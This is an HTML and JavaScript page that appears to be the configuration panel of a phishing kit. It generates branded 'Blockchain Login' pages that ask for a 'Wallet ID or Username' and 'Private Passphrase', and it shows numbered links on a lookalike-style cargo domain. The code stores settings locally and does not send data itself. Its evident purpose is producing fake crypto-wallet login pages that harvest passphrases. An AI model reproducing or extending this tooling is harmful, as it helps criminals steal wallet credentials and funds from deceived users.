<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Template Configuration</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f7f7f7;
      padding: 20px;
    }

    .container {
      max-width: 500px;
      margin: auto;
      background: white;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      padding: 20px;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      display: block;
      margin: 15px 0 5px;
    }

    input[type="text"],
    input[type="file"],
    input[type="color"] {
      width: 100%;
      padding: 8px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
    }

    .inline-group {
      display: flex;
      gap: 10px;
    }

    .inline-group > div {
      flex: 1;
    }

    .section-title {
      font-weight: bold;
      margin: 25px 0 10px;
      border-bottom: 1px solid #ccc;
      padding-bottom: 5px;
    }

    .generate-button {
      background-color: #0057ff;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 20px;
    }

    .generate-button:hover {
      background-color: #0044cc;
    }

    .upload-header {
      text-align: center;
      font-weight: bold;
      font-size: 18px;
    }

    .upload-icon {
      display: block;
      margin: 10px auto;
      font-size: 40px;
    }

    .upload-note {
      text-align: center;
      font-size: 12px;
      color: gray;
    }

    .image-preview {
      background-color: #eee;
      text-align: center;
      padding: 10px;
      font-weight: bold;
      color: #555;
      border: 1px solid #ccc;
      border-radius: 6px;
      margin-bottom: 10px;
    }

    .generated-link {
      margin-top: 20px;
      padding: 12px;
      background: #e6f0ff;
      border: 1px solid #a3c2ff;
      color: #003380;
      font-weight: bold;
      text-align: center;
      border-radius: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="upload-header">‚úîÔ∏è IMAGE (UPLOAD)</div>
    <div class="upload-icon">‚¨ÜÔ∏è</div>
    <div class="upload-note">(PNG / JPG / JPEG / GIF)</div>

    <label>LOGO</label>
    <input type="file" accept="image/*" onchange="previewImage(this, 'logoPreview')" />
    <div class="image-preview" id="logoPreview">NO IMAGE</div>

    <label>LOGO SIZE</label>
    <input type="text" id="logoSize" value='width="70px" height="70px"' />

    <label>BANNER</label>
    <input type="file" accept="image/*" onchange="previewImage(this, 'bannerPreview')" />
    <div class="image-preview" id="bannerPreview">NO IMAGE</div>

    <label>BANNER SIZE</label>
    <input type="text" id="bannerSize" value='width="300px" height="50px"' />

    <label>TEMPLATE NAME</label>
    <input type="text" id="templateName" placeholder="NAME" />

    <label>BODY COLOR</label>
    <input type="color" id="bodyColor" value="#000000" />

    <label>BUTTON COLOR</label>
    <input type="color" id="buttonColor" value="#0057ff" />

    <label>TEXT COLOR</label>
    <input type="color" id="textColor" value="#000000" />

    <div class="section-title">‚öôÔ∏è INPUTs CONFIGURATION</div>

    <label>DESCRIPTION</label>
    <input type="text" id="description" value="Blockchain Login" />

    <div class="inline-group">
      <div>
        <label>EMAIL CONTENT</label>
        <input type="text" id="emailContent" value="Wallet ID or Username" />
      </div>
      <div>
        <label>EMAIL LABEL</label>
        <input type="text" id="emailLabel" value="SHOW" />
      </div>
    </div>

    <div class="inline-group">
      <div>
        <label>PASSWORD CONTENT</label>
        <input type="text" id="passwordContent" value="Private Passphrase" />
      </div>
      <div>
        <label>PASSWORD LABEL</label>
        <input type="text" id="passwordLabel" value="SHOW" />
      </div>
    </div>

    <div class="inline-group">
      <div>
        <label>BUTTON CONTENT</label>
        <input type="text" id="buttonContent" value="Log In" />
      </div>
      <div>
        <label>BUTTON WIDTH</label>
        <input type="text" id="buttonWidth" value="300px" />
      </div>
    </div>

    <button class="generate-button">‚ú® GENERATE</button>
    <div id="generatedLink" class="generated-link" style="display:none;"></div>
  </div>

  <script>
    function previewImage(input, previewId) {
      const preview = document.getElementById(previewId);
      const file = input.files[0];

      if (file) {
        const reader = new FileReader();
        reader.onload = () => {
          preview.innerHTML = `<img src="${reader.result}" style="max-width: 100%; max-height: 100px; border-radius: 6px;" />`;
          preview.setAttribute("data-image", reader.result); // store image
        };
        reader.readAsDataURL(file);
      } else {
        preview.innerHTML = "NO IMAGE";
        preview.removeAttribute("data-image");
      }
    }

    document.querySelector('.generate-button').addEventListener('click', () => {
      let count = parseInt(localStorage.getItem("formCounter") || "1");
      const link = `https://x-cargo-expree.com${count}`;

      const data = {
        logo: document.getElementById("logoPreview").getAttribute("data-image") || null,
        logoSize: document.getElementById("logoSize").value,
        banner: document.getElementById("bannerPreview").getAttribute("data-image") || null,
        bannerSize: document.getElementById("bannerSize").value,
        templateName: document.getElementById("templateName").value,
        bodyColor: document.getElementById("bodyColor").value,
        buttonColor: document.getElementById("buttonColor").value,
        textColor: document.getElementById("textColor").value,
        description: document.getElementById("description").value,
        emailContent: document.getElementById("emailContent").value,
        emailLabel: document.getElementById("emailLabel").value,
        passwordContent: document.getElementById("passwordContent").value,
        passwordLabel: document.getElementById("passwordLabel").value,
        buttonContent: document.getElementById("buttonContent").value,
        buttonWidth: document.getElementById("buttonWidth").value,
        createdAt: new Date().toISOString()
      };

      // Save to localStorage
      localStorage.setItem(`form_${count}`, JSON.stringify(data));
      localStorage.setItem("formCounter", count + 1);

      // Display the generated link
      const linkDiv = document.getElementById("generatedLink");
      linkDiv.style.display = "block";
      linkDiv.innerHTML = `üîó Form link: <a href="${link}" target="_blank">${link}</a>`;
    });
  </script>
</body>
</html>
